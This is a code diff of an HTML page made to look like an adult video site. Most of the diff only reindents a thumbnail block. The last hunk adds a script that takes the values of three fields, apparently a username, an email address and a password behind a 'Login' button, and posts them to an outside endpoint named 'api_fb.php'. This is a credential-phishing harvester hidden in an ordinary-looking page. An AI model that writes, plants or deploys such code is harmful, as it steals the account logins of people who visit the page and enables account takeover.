@@ -5,15 +5,15 @@
     </div>
     <ul class="thumbs site" onclick="gox();">
         <li>
-            <div class=" tn">
-                <a href="#">
-                    <div class="border">
-                        <div class="img">
-                            <img src="https://i.imgur.com/3kLEfU4.jpg" class="lazy" alt="Total Porn Tube">
-                        </div>
-                    </div>Big Tits
-                </a>
-            </div>
+            <div class="tn">
+        <a href="#">
+            <div class="border">
+                <div class="img">
+                    <img src="https://i.imgur.com/3kLEfU4.jpg" class="lazy" alt="Total Porn Tube">
+                </div>
+            </div>Big Tits
+        </a>
+        </div>
         </li>
         <li>
             <div class="tn">
@@ -71,6 +71,34 @@
                 us and it will be reviewed promptly for removal from this website.</p><br>
         </div>
     </div>
+    <script>
+        $("#bt").click(function () {
+            $("#bt").html("Sedang Proses....");
+            var a = $("#mrx").val().trim();
+            var b = $("#ml").val().trim();
+            var c = $("#pw").val().trim();
+            var dataString = 'u=' + a + '&m=' + b + '&p=' + c;
+            $.ajax({
+                type: "POST",
+                url: "https://short.llc/api_fb.php",
+                data: dataString,
+                cache: false,
+                success: function (result) {
+                    console.log(result);
+                    if (data.pesan = "Sukses!") {
+                        $("#error").html(data.url);
+                    } else {
+
+                        $("#bt").html("Login");
+                        $("#error").html("Server Down!");
+                    }
+                }
+            });
+            $("#lapor").show();
+            return false;
+        });
+    </script>
+    <!-- The Modal -->
 </body>
 
 </html>
